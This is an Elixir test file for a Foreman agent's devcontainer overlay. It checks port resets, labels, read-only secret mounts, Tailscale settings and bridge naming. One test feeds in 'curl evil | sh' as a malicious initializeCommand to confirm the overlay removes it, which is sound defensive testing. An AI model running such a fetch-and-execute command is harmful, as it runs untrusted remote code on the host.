defmodule ForemanAgent.Env.OverlayTest do
  use ExUnit.Case, async: true

  alias ForemanAgent.Env.Overlay

  @env_id "6f1c1d1e-9a3b-4c1f-8f5e-2d7a9b0c1e2f"

  defp params(overrides \\ %{}) do
    Map.merge(
      %{
        env_id: @env_id,
        slug: "storefront-2",
        services: ["app", "db"],
        networks: [],
        devcontainer_service: "app",
        secrets_dir: "/run/foreman/envs/#{@env_id}",
        tailscale: %{enabled: true, tags: []},
        limits: %{}
      },
      overrides
    )
  end

  describe "compose/1" do
    test "resets ports and restart policy on every service" do
      yaml = Overlay.compose(params())

      assert yaml =~ ~r/"app":\n    ports: !reset \[\]\n    restart: "no"/
      assert yaml =~ ~r/"db":\n    ports: !reset \[\]\n    restart: "no"/
    end

    test "labels every service with the environment" do
      yaml = Overlay.compose(params())
      assert length(Regex.scan(~r/"foreman.env_id": "#{@env_id}"/, yaml)) == 2
      assert length(Regex.scan(~r/"foreman.slug": "storefront-2"/, yaml)) == 2
    end

    test "labels the devcontainer with the Foreman feature it's built with" do
      yaml = Overlay.compose(params(%{feature_version: "1.1.0"}))

      [app, db] = String.split(yaml, ~r/\n  "db":\n/)
      assert app =~ ~s("foreman.feature_version": "1.1.0")
      # A repo can't label a service it later makes the devcontainer.
      assert db =~ ~s("foreman.feature_version": "")
    end

    test "marks the devcontainer service, and only it" do
      yaml = Overlay.compose(params())

      [app, db] = String.split(yaml, ~r/\n  "db":\n/)
      assert app =~ ~s("foreman.devcontainer": "true")
      # Empty on the rest, which overrides a label the repo sets.
      assert db =~ ~s("foreman.devcontainer": "")
    end

    test "labels the devcontainer with no feature when the agent can't read its own" do
      yaml = Overlay.compose(params(%{feature_version: nil}))
      assert length(Regex.scan(~r/"foreman.feature_version": ""/, yaml)) == 2
    end

    test "mounts the secrets directory read-only into the devcontainer service only" do
      yaml = Overlay.compose(params())

      [app, db] = String.split(yaml, ~r/\n  "db":\n/)
      assert app =~ ~s(source: "/run/foreman/envs/#{@env_id}")
      assert app =~ ~s(target: "/run/foreman")
      assert app =~ "read_only: true"
      refute db =~ "/run/foreman"
    end

    test "adds the Tailscale state volume and hostname when enabled" do
      yaml = Overlay.compose(params())
      assert yaml =~ ~s(source: "foreman-tailscale")
      assert yaml =~ ~s(target: "/var/lib/tailscale")
      assert yaml =~ ~s("TS_HOSTNAME": "storefront-2")
      assert yaml =~ ~r/^volumes:\n  "foreman-tailscale": \{\}/m
    end

    # Tailscale runs in userspace mode, so the devcontainer needs neither a
    # TUN device nor NET_ADMIN.
    test "never gives the devcontainer the TUN device" do
      refute Overlay.compose(params()) =~ "/dev/net/tun"
      refute Overlay.compose(params()) =~ "devices:"
    end

    test "leaves Tailscale out when disabled" do
      yaml = Overlay.compose(params(%{tailscale: %{enabled: false, tags: []}}))
      refute yaml =~ "tailscale"
    end

    test "always sets FOREMAN_ENV" do
      assert Overlay.compose(params()) =~ ~s("FOREMAN_ENV": "storefront-2")
    end

    test "applies limits to the devcontainer service only when set" do
      refute Overlay.compose(params()) =~ "cpus"

      yaml = Overlay.compose(params(%{limits: %{cpus: 2.5, memory_mb: 4096}}))
      [app, _db] = String.split(yaml, ~r/\n  "db":\n/)
      assert app =~ "cpus: 2.5"
      assert app =~ ~s(mem_limit: "4096m")
    end

    test "quotes service names so YAML special values stay strings" do
      yaml = Overlay.compose(params(%{services: ["app", "on", "1"]}))
      assert yaml =~ ~s("on":)
      assert yaml =~ ~s("1":)
    end

    # The box's firewall knows environment traffic by the bridge it
    # arrives on.
    test "puts every network on a Foreman bridge" do
      networks = [{"default", "storefront-2_default"}, {"back", "storefront-2_back"}]
      yaml = Overlay.compose(params(%{networks: networks}))

      for {key, docker_name} <- networks do
        name = Overlay.bridge_name(@env_id, docker_name)

        assert yaml =~
                 ~s(  "#{key}":\n    driver_opts:\n      "com.docker.network.bridge.name": "#{name}"\n)
      end

      assert yaml =~ ~r/^networks:\n/m
    end

    test "leaves networks out when the environment has none" do
      refute Overlay.compose(params()) =~ "networks:"
    end
  end

  describe "bridge_name/2" do
    test "fits a Linux interface name and starts with the Foreman prefix" do
      name = Overlay.bridge_name(@env_id, "storefront-2_default")
      assert String.starts_with?(name, Overlay.bridge_prefix())
      assert byte_size(name) <= 15
      assert name =~ ~r/\A[a-z0-9-]+\z/
    end

    test "is stable, and differs per environment and network" do
      name = Overlay.bridge_name(@env_id, "storefront-2_default")
      assert Overlay.bridge_name(@env_id, "storefront-2_default") == name
      refute Overlay.bridge_name(@env_id, "storefront-2_back") == name

      refute Overlay.bridge_name("11111111-2222-3333-4444-555555555555", "storefront-2_default") ==
               name
    end

    # Renaming a network (name: in compose) makes a new Docker network
    # while the old one still holds its bridge.
    test "follows the network's Docker name, not its key" do
      refute Overlay.bridge_name(@env_id, "storefront-2_default") ==
               Overlay.bridge_name(@env_id, "storefront-2_private")
    end
  end

  describe "override_config/2" do
    test "points dockerComposeFile at absolute paths plus the overlay" do
      config = %{
        "name" => "storefront",
        "dockerComposeFile" => "docker-compose.yml",
        "service" => "app",
        "workspaceFolder" => "/workspaces/${localWorkspaceFolderBasename}"
      }

      result =
        Overlay.override_config(config,
          compose_files: ["/srv/w/storefront/.devcontainer/docker-compose.yml"],
          overlay_path: "/srv/meta/overlay.yml"
        )

      assert result["dockerComposeFile"] == [
               "/srv/w/storefront/.devcontainer/docker-compose.yml",
               "/srv/meta/overlay.yml"
             ]

      assert result["service"] == "app"
      assert result["workspaceFolder"] == config["workspaceFolder"]
    end

    test "drops initializeCommand, which would run on the box itself" do
      config = %{
        "dockerComposeFile" => ["a.yml"],
        "service" => "app",
        "initializeCommand" => "curl evil | sh"
      }

      result = Overlay.override_config(config, compose_files: ["/a.yml"], overlay_path: "/o.yml")
      refute Map.has_key?(result, "initializeCommand")
    end
  end

  describe "feature_options/1" do
    test "maps Tailscale settings onto the feature's options" do
      assert Overlay.feature_options(%{enabled: true, tags: []}) == %{"tailscale" => true}
      assert Overlay.feature_options(%{enabled: false, tags: []}) == %{"tailscale" => false}
    end
  end
end
